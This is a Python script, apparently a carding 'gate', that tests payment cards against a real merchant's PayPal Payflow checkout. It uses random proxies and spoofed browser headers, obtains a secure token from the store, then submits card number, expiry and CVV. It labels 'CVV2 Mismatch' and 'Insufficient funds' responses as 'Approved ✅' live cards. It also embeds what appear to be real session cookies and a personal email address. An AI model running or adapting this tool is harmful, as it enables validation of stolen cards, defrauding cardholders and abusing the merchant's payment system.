from httpx import AsyncClient, RequestError, TimeoutException, RemoteProtocolError, ProxyError, ReadTimeout
import random
import asyncio
import logging
from functions.functions import ProxyRandom2,ProxyRandom
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.basicConfig(level=logging.ERROR)
#GATE DD
def buscar(data, first, last):
    try:
        return data.split(first)[1].split(last)[0]
    except IndexError:
        return None

def generate_random_headers():
    sec_ch_ua = random.choice([
        'Google Chrome";v="93", " Not;A Brand";v="99", "Chromium";v="93',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36'
    ])
    sec_ch_ua_mobile = random.choice(['?0', '?1'])
    sec_ch_ua_platform = random.choice(['Windows', 'macOS', 'Linux', 'Android', 'iOS'])

    return {
        'sec-ch-ua': sec_ch_ua,
        'sec-ch-ua-mobile': sec_ch_ua_mobile,
        'sec-ch-ua-platform': sec_ch_ua_platform,
        'user-agent': f'Mozilla/5.0 ({random.choice(["Windows NT 10.0", "Macintosh; Intel Mac OS X 10_15_7", "X11; Linux x86_64", "Windows NT 6.1", "iPhone; CPU iPhone OS 13_5 like Mac OS X"])}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.choice(["86.0", "87.0", "88.0", "89.0", "90.0"])} Safari/537.36'
    }

async def retry_request(session, url, method='get', headers=None, data=None, retries=3, delay=5):
    for attempt in range(retries):
        try:
            if method == 'get':
                response = await session.get(url, headers=headers)
            elif method == 'post':
                response = await session.post(url, headers=headers, data=data)
            response.raise_for_status()  # Levanta un error para códigos de estado HTTP >= 400
            return response
        except RequestError as e:
            logging.error(f"Attempt {attempt+1} failed: {e}")
            if attempt < retries - 1:
                await asyncio.sleep(delay)
    raise RequestError(f"Failed after {retries} attempts")

async def klk(cc, mes, ano, cvv, use_proxy2=False):
    proxyg = await ProxyRandom2() if use_proxy2 else await ProxyRandom()
    try:
        async with AsyncClient(
            follow_redirects=True,
            verify=False,
            proxies=proxyg,
        ) as session:
            email = f'fabian{random.randint(1, 99)}@gmail.com'
            gcap = False
            myip = await session.get("https://api.ipify.org/")
            await retry_request(session, 'https://pioneerathletics.com/checkout/', headers=generate_random_headers())

            headers1 = generate_random_headers()
            headers1.update({
                'authority': 'pioneerathletics.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://pioneerathletics.com',
                'referer': 'https://pioneerathletics.com/checkout/',
                'x-requested-with': 'XMLHttpRequest',
                'x-newrelic-id': 'VwEFV19aCBABVFhSAwYCU1YC',
                'tracestate': '1322840@nr=0-1-3726990-1120139856-54425d73d52bb5a2----1717768525300',
                'traceparent': '00-fa5f3ae05c8904d4e7229972fa025b25-54425d73d52bb5a2-01',
                'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjM3MjY5OTAiLCJhcCI6IjExMjAxMzk4NTYiLCJpZCI6IjU0NDI1ZDczZDUyYmI1YTIiLCJ0ciI6ImZhNWYzYWUwNWM4OTA0ZDRlNzIyOTk3MmZhMDI1YjI1IiwidGkiOjE3MTc3Njg1MjUzMDAsInRrIjoiMTMyMjg0MCJ9fQ==',
                'accept-language': 'es-US,es-419;q=0.9,es;q=0.8,en;q=0.7'
            })

            data1 = 'form_key=61xpaB6VIelfgozn&captcha_form_id=payment_processing_request&billing-address-same-as-shipping=on&payment%5Bmethod%5D=payflowpro&billing-address-same-as-shipping=on&captcha_form_id=co-payment-form&privacy_checkbox=1&am-ccpa-checkboxes-from=checkout&am_invisible_token={gcap}&g-recaptcha-response={gcap}&controller=checkout_flow&cc_type=VI'

            req = await retry_request(session, 'https://pioneerathletics.com/paypal/transparent/requestSecureToken/', method='post', headers=headers1, data=data1)
            result = req.text
            nonceid = buscar(result, '"securetokenid":"', '"')
            noncetoken = buscar(result, '"securetoken":"', '"')

            headers2 = generate_random_headers()
            headers2.update({
                'authority': 'payflowlink.paypal.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'content-type': 'application/x-www-form-urlencoded',
                'referer': '',
                'cookie': 'cookie_check=yes;d_id=645c9f9eda33481992751f192095e84a1714264708847;TfXMWj95u2_Zf1Kmv_GCUOjlGG8=7RjeQCBxAYMb0mMAoBIOCo_dcfY5ajT8E2tGgfezbog23cqh5KxpiXgDgSqlBEdNk4zOXEr2-djPBoLSqVQiiQSTeN7i9TPfxjN4JpKKDiSCFeiJkQrq7InYLktMvpBbk3YnYxXBhmKJGM4NoxTOgdMbi_57HxyJKv35wGe0QQpplJXzqGk226Wq2S0;login_email=Lindaagustin431%40gmail.com;rmuc=WedkM8GaQRUJ0ztHxLRlsQKMNLt9ZWKbJtRQan0ESIKSdXkX5ZNId2c3DHUVJR39yEYhloy41xpIpISSJIMMYrgRdjogighELMPKjytrKQe2WuLjs5vU-4fbOT66WRipc33_yAijWVIyXUji5ulr11P0OQwzq1DVJrdeitYWFOLe25omgAXhDJq9VfqZrxQKAWYemvdCOjDHd2zvUPX306_IvUAD7w9XhIb1puFOfDLwdFeH;cookie_prefs=T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dinitial;_ga_FQYH6BLY4K=GS1.1.1714329099.1.1.1714329120.0.0.0;ts=vreXpYrS%3D1812374267%26vteXpYrS%3D1717768067%26vr%3Dc550fae618e0aa385036a1d2ffd30f9e%26vt%3Df2d920da18f0a5716a065771fc09603f%26vtyp%3Dreturn;ts_c=vr%3Dc550fae618e0aa385036a1d2ffd30f9e%26vt%3Df2d920da18f0a5716a065771fc09603f',
                'accept-language': 'es-US,es-419;q=0.9,es;q=0.8,en;q=0.7'
            })

            data2 = f'result=0&securetoken={noncetoken}&securetokenid={nonceid}&respmsg=Approved&result_code=0&csc={cvv}&expdate={mes}{ano}&acct={cc}'

            req2 = await retry_request(session, 'https://payflowlink.paypal.com/', method='post', headers=headers2, data=data2)
            result2 = req2.text
            msg = buscar(result2, 'type="hidden" name="RESPMSG" value="', '"')
            avsdata = buscar(result2, 'type="hidden" name="AVSDATA" value="', '"')
            cvvdata = buscar(result2, 'type="hidden" name="PROCCVV2" value="', '"')
            if not msg:
                msg = 'Response Not Found, Contact Owner !'
            if not avsdata:
                avsdata = 'Not found'
            if not cvvdata:
                cvvdata = 'Not found'
            
    except (RemoteProtocolError, ReadTimeout, ProxyError, RequestError, TimeoutException) as e:
        logging.error(f"An error occurred: {e}")
        status = 'Proxy Dead Contact Owner'
        msg = 'Error ⚠️'
        return status, msg, 'Not found', 'Not found'
    
    # ----- [ Respuestas ] ----- #
    
    if 'CVV2 Mismatch' in result2:
        status = "Approved ✅"
        message = "CVV2 Mismatch."
    elif 'Verified' in result2:
        status = "Approved ✅"
        message = "Verified"
    elif 'Insufficient funds available' in result2:
        status = "Approved ✅"
        message = "Verified"
        
    else:
        status = 'Declined ❌'
        message = msg
    print(cc,mes,ano,cvv,status,message,avsdata,cvvdata,myip.text)
    return status, message, avsdata, cvvdata
